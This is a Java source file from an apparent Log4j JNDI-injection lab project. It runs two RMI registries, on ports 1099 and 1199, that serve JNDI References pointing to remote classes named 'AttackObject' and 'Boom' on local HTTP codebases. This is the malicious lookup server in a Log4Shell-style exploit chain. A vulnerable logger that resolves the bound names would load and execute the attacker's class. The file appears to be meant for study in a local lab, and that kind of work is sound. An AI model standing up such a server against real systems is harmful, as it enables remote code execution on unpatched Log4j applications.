package com.ppfly.log4j2jndirmiinjection;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RegisterServer {

    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        start1099();
        start1199();
    }

    /**
     * 本地
     *
     * @throws RemoteException
     * @throws NamingException
     * @throws AlreadyBoundException
     */
    private static void start1099() throws RemoteException, NamingException, AlreadyBoundException {
        //设置RMI服务端口号
        Registry registry = LocateRegistry.createRegistry(1099);
        System.out.println("Local Registry RMI in 1099");
        // 类名 和类的全名  和地址
        Reference reference = new Reference("AttackObject", "AttackObject", "http://localhost:8080/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("obj", referenceWrapper);
        System.out.println("RegistryServer 1099 is running ... ");
    }

    /**
     * nginx
     *
     * @throws RemoteException
     * @throws NamingException
     * @throws AlreadyBoundException
     */
    private static void start1199() throws RemoteException, NamingException, AlreadyBoundException {
        //设置RMI服务端口号
        Registry registry = LocateRegistry.createRegistry(1199);
        System.out.println("Local Registry RMI in 1199");
        // 类名 和类的全名  和nginx地址
        Reference reference = new Reference("Boom", "Boom", "http://localhost/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("boom", referenceWrapper);
        System.out.println("RegistryServer 1199 is running ... ");
    }

}